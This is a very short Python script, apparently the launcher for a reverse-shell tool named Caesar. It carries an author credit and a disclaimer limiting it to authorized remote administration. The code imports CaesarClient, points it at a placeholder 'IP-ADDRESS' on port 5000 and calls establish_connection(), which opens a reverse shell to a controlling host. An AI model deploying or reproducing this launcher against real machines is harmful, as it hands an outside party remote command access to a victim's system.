#Created by Vasto Boy

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.


from caesar_client import CaesarClient


caesar = CaesarClient("IP-ADDRESS", 5000)
caesar.establish_connection()

